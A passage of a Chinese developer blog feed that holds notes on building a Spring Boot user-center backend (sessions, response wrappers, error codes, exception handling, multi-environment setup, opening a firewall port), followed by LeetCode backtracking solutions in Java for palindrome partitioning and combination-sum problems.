ID</td><td>数据存储在客户端浏览器中</td></tr><tr><td><strong>生命周期</strong></td><td>通常与会话相关，浏览器关闭或超时后失效</td><td>可以设置过期时间，也可以是会话级的</td></tr><tr><td><strong>安全性</strong></td><td>更安全，因为数据保存在服务器端，不易被篡改</td><td>较不安全，易受攻击（如XSS、劫持等），敏感信息不宜存储</td></tr><tr><td><strong>数据类型</strong></td><td>可以存储复杂的数据结构</td><td>只能存储字符串类型的数据</td></tr><tr><td><strong>传输数据量</strong></td><td>只传输Session ID，传输量小，性能较高</td><td>传输全部数据，可能增加网络开销</td></tr><tr><td><strong>服务器负担</strong></td><td>需要服务器资源来存储Session数据</td><td>不占用服务器资源，减轻服务器负担</td></tr><tr><td><strong>适用场景</strong></td><td>适用于需要处理敏感信息或复杂数据的场景</td><td>适用于存储客户端简单数据（如用户偏好）或跟踪用户行为</td></tr></tbody></table><p>在application.yml文件下配置session</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">user-center</span></span><br><span class="line">    <span class="comment"># DataSource Config</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/yourdatabase</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">yourname</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">yourpwd</span></span><br><span class="line">  <span class="attr">session:</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="number">86400</span></span><br></pre></td></tr></table></figure><p>通用类型data，使用泛型.不管接口返回的内容类型是什么都可以兼容.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseResponse</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>类名</th><th>作用描述</th><th>主要功能</th></tr></thead><tbody><tr><td><code>BaseResponse</code></td><td>通用返回类，用于封装API响应数据，包含状态码、数据、消息和描述等信息。</td><td>提供多种构造方法以适应不同的返回类型。</td></tr><tr><td><code>ErrorCode</code></td><td>错误码枚举类，定义了常见的错误类型及其对应的状态码、消息和描述。</td><td>管理和提供标准化的错误码信息。</td></tr><tr><td><code>ResultsUtils</code></td><td>返回工具类，提供便捷的方法创建标准化的响应对象，简化响应构造过程。</td><td>提供<code>success</code>和多种<code>error</code>方法用于生成响应。</td></tr></tbody></table><p><strong><code>BaseResponse</code> 类</strong></p><ul><li><p>用于统一定义接口返回的数据结构，包含状态码、数据、消息和描述等字段。</p></li><li><p>提供了多种构造函数，支持不同情境下的响应创建（例如成功、错误等）。</p></li><li><p><strong><code>ErrorCode</code> 枚举类</strong></p></li><li><p>将常见的错误类型抽象为枚举，定义了每种错误的状态码、消息和描述。</p></li><li><p>提供了一种集中式管理错误信息的方式，便于统一处理和维护。</p></li></ul><p><strong><code>ResultsUtils</code> 工具类</strong></p><ul><li>提供了简单的方法来快速生成<code>BaseResponse</code>对象，减少重复代码。</li><li>包含针对成功和多种错误情况的静态方法，简化了对API响应的构建。</li></ul><h4 id="依据业务逻辑写的错误码"><a href="#依据业务逻辑写的错误码" class="headerlink" title="依据业务逻辑写的错误码"></a>依据业务逻辑写的错误码</h4><p>生成文档的话最好写上注释（Javadoc）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.common;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">ErrorCode</span> &#123;</span><br><span class="line"></span><br><span class="line">    PARAMS_ERROR(<span class="number">40000</span>,<span class="string">&quot;请求参数错误&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="comment">//用户问题</span></span><br><span class="line">    NULL_ERROR(<span class="number">40001</span>,<span class="string">&quot;请求数据错误&quot;</span>,<span class="string">&quot;&quot;</span>),</span><br><span class="line">    NOT_LOGIN(<span class="number">40100</span>,<span class="string">&quot;未登录&quot;</span>,<span class="string">&quot;&quot;</span>),</span><br><span class="line">    NO_AUTH(<span class="number">40101</span>,<span class="string">&quot;没有权限&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String message;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String description;</span><br><span class="line"></span><br><span class="line">     ErrorCode(<span class="type">int</span> code, <span class="keyword">final</span> String message, <span class="keyword">final</span> String description) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">        <span class="built_in">this</span>.description = description;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>枚举值不支持set，所以直接定义为final.<br>运行时异常不用throws捕获和try-catch捕获.可以理解为description是给前端用的（给前端返回参数）</p><p><strong>定义业务异常类</strong></p><ul><li><p>相对与Java的异常类，支持更多字段</p></li><li><p>自定义构造函数，更灵活&#x2F;快捷的设置字段</p></li><li><pre><code class="java">package com.yub.usercenter.exception;import com.yub.usercenter.common.ErrorCode;/** * 自定义异常类 * * @author yub */public class BusinessException extends RuntimeException&#123;    private final int code;    private final String description;    public BusinessException(String message, int code, String description) &#123;        super(message);        this.code = code;        this.description = description;    &#125;    public BusinessException(ErrorCode errorCode) &#123;        super(errorCode.getMessage());        this.code = errorCode.getCode();        this.description = errorCode.getDescription();    &#125;    public BusinessException(ErrorCode errorCode, String description) &#123;        super(errorCode.getMessage());        this.code = errorCode.getCode();        this.description = description;    &#125;    public int getCode() &#123;        return this.code;    &#125;    public String getDescription() &#123;        return this.description;    &#125;&#125;<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**编写全局异常处理器**</span><br><span class="line"></span><br><span class="line">- 捕获代码中的所有异常，内部消化（封装），让前端得到更详细的业务报错/信息，同时屏蔽框架本身的异常（不暴露服务器内部状态）</span><br><span class="line">- 使用Spring AOP进行实现：在调用方法前后进行额外的处理</span><br><span class="line">- 集中处理，比如记录日志</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="keyword">package</span> com.yub.usercenter.exception;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.BaseResponse;</span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.ErrorCode;</span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.common.ResultsUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.ExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RestControllerAdvice;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 全局异常处理器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GolobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler(BusinessException.class)</span></span><br><span class="line">    <span class="keyword">public</span> BaseResponse businessExceotion(BusinessException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;businessException:&quot;</span> + e.getMessage(),e);</span><br><span class="line">        <span class="keyword">return</span> ResultsUtils.error(e.getCode(),e.getMessage(),e.getDescription());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span></span><br><span class="line">    <span class="keyword">public</span> BaseResponse runtimeException(RuntimeException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;runtimeException:&quot;</span>,e);</span><br><span class="line">        <span class="keyword">return</span> ResultsUtils.error(ErrorCode.SYSTEM_ERROR,e.getMessage(),<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>自定义快捷键</p><p><img src="/../imgs/2025-01/image-20250120221223730.png" alt="image-20250120221223730"></p><p>$END$是输入快捷语句之后能光标能自动定位到括号位置初.</p><p><img src="/../imgs/2025-01/image-20250120221257889.png" alt="image-20250120221257889"></p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><ul><li>正向代理，替客户端向服务器接发送请求</li><li>反向代理，替服务器接收请求.<br><img src="/../imgs/2025-01/image-20250120214529168.png" alt="image-20250120214529168"></li></ul><p>application.yml指定接口全局api</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">servlet:</span></span><br><span class="line"><span class="attr">context-path:</span> <span class="string">/api</span></span><br></pre></td></tr></table></figure><h4 id="多环境"><a href="#多环境" class="headerlink" title="多环境"></a>多环境</h4><ul><li>指同一套项目代码在不同的阶段需要根据实际情况来调整配置并且部署到不同的机器上.</li></ul><p><strong>为什么需要</strong></p><ul><li><p>每个环境互不影响</p></li><li><p>区分不同的阶段：开发&#x2F;测试&#x2F;生产</p></li><li><p>对项目进行优化</p><ul><li>本地日志级别</li><li>精简依赖，节约项目体积</li><li>项目的环境&#x2F;参数可以调整，比如JVM参数</li></ul><p>针对不同的环境做不同的事情.</p></li></ul><p><strong>多环境分类</strong></p><ul><li>本地环境（自己的电脑）localhost</li><li>开发环境（远程开发）多人协作</li><li>测试环境（测试）开发&#x2F;测试&#x2F;产品。独立的数据库、独立的服务器</li><li>预发布环境（体验服）基本和正式环境一致，正式环境的数据库更严谨查出问题</li><li>正式环境（线上，公开访问的项目）尽量不改动，保证上线“完美”</li><li>沙箱环境（实验环境）为了做实验</li></ul><h4 id="后端多环境实战"><a href="#后端多环境实战" class="headerlink" title="后端多环境实战"></a>后端多环境实战</h4><p>SpringBoot项目通过application.yml添加不同的后缀来区分.<br><img src="/../imgs/2025-01/image-20250118153224532.png" alt="image-20250118153224532"></p><h5 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h5><h6 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h6><ol><li>有一台自己的服务器（腾讯云阿里云等）</li><li>代码打包完成，完成部署备份文件.</li></ol><h6 id="使用Linux宝塔部署"><a href="#使用Linux宝塔部署" class="headerlink" title="使用Linux宝塔部署"></a>使用Linux宝塔部署</h6><p>充值宝塔访问端口和路径后无法正常访问<img src="/../imgs/2025-01/image-20250119165712913.png" alt="image-20250119165712913"></p><p>在腾讯云防火墙放行之后还要在Linux宝塔端同步放行.（踩大坑呜呜）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查已放行端口</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">新增放行端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">刷新</span></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>做好计划，从宏观到局部，由泛到精.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x20.</title>
      <link href="/2024/11/27/yub%E3%81%AEAlgorithm0x20/"/>
      <url>/2024/11/27/yub%E3%81%AEAlgorithm0x20/</url>
      
        <content type="html"><![CDATA[<h4 id="分割回文串"><a href="#分割回文串" class="headerlink" title="分割回文串"></a>分割回文串</h4><p>link：<a href="https://leetcode.cn/problems/palindrome-partitioning/description/">131. 分割回文串 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>主题思想是和之前做的组合II相同的，问题的关键难点就是在怎么处理切割上.<br>首先递归参数传入<strong>startIndex</strong>是表示<strong>下一轮递归遍历起始位置</strong>，那么startIndx就是作为我们的<strong>切割线</strong>一角色.<br>再看回文子串如何判断？采用双指针法，一个在头一个在尾前后指针指向位置的元素相等就是回文串了.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    Deque&lt;String&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; <span class="title function_">partition</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        backtracking(s,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(String s, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="comment">//起始位置大于s的长度-&gt;找到了一组分割方案</span></span><br><span class="line">        <span class="keyword">if</span>(startIndex &gt;= s.length()) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(deque));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="comment">//记录回文串</span></span><br><span class="line">            <span class="keyword">if</span>(isPalindrome(s,startIndex,i)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.substring(startIndex,i + <span class="number">1</span>);</span><br><span class="line">                deque.addLast(str);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            backtracking(s, i + <span class="number">1</span>);</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断是否是回文串</span></span><br><span class="line">            <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(String s, <span class="type">int</span> startIndex, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex, j = end; i &lt; j; i++,j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s.charAt(i) != s.charAt(j)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="复原ip地址"><a href="#复原ip地址" class="headerlink" title="复原ip地址"></a>复原ip地址</h4><p>link：</p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x19.</title>
      <link href="/2024/11/26/yub%E3%81%AEAlgorithm.0x19/"/>
      <url>/2024/11/26/yub%E3%81%AEAlgorithm.0x19/</url>
      
        <content type="html"><![CDATA[<h4 id="组合总和"><a href="#组合总和" class="headerlink" title="组合总和"></a>组合总和</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>其实思路和昨天的很像，但是元素可以复用而且也不是字符串.<br>那还是依旧使用path进行记录,res进行返回结果，sum进行统计最后再加上一个标记位置进行判断即可.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        backstracking(candidates, target, sum, startIndex);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backstracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> sum, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">           res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            backstracking(candidates,target,sum,i);</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="组合总和II"><a href="#组合总和II" class="headerlink" title="组合总和II"></a>组合总和II</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum-ii/description/">40. 组合总和 II - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>上一题的plus版，最开始想的是和上一题的思路相同加一个set去掉重复的集合结果会超时…（菜就多练）<br>这里就出现了一个新知识点——学会加标识辅助数组.(苦笑)<br>潦草的分析图</p><p><img src="/../imgs/2024-10/image-20241126211756826.png" alt="image-20241126211756826">我们需要额外创建一个boolean的used数组来记录当前的位置是否被用过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//标记数组</span></span><br><span class="line">    <span class="type">boolean</span>[] used;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        used = <span class="keyword">new</span> <span class="title class_">boolean</span>[candidates.length];</span><br><span class="line">        Arrays.fill(used,<span class="literal">false</span>);</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backstracking(candidates,target,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backstracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target,<span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sum + candidates[i] &gt; target) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//出现重复节点 同层的第一个节点已经被访问过 pass</span></span><br><span class="line">            <span class="comment">//candidates[i] == candidates[i - 1] 就是对应[2,2]的选取情况</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>] &amp;&amp; !used[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="literal">true</span>;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backstracking(candidates, target, i + <span class="number">1</span>);</span><br><span class="line">            used[i] = <span class="literal">false</span>;</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>去掉 <code>candidates[i] == candidates[i - 1]</code>，会导致无法判断相邻重复元素，生成重复的组合.</p><p><strong>完整逻辑</strong>：</p><ul><li><code>candidates[i] == candidates[i - 1]</code>：用于识别相邻的重复元素。</li><li><code>!used[i - 1]</code>：确保同一层中，跳过未使用的重复元素。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x18</title>
      <link href="/2024/11/22/yub%E3%81%AEAlgorithm.0x18/"/>
      <url>/2024/11/22/yub%E3%81%AEAlgorithm.0x18/</url>
      
        <content type="html"><![CDATA[<h4 id="组合总和III"><a href="#组合总和III" class="headerlink" title="组合总和III"></a>组合总和III</h4><p>link：<a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>既然是要比对，那自然需要和目标值比对的sum，同时要记录path.<br>这么一想其实和我们之前分析的组合问题就非常相似了.<br>注意一下题目中给定的判定逻辑限制（数字1-9且不能重复）很完美的组合问题.<br>天生的回溯搭子.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//记录路径</span></span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//记录结果</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title 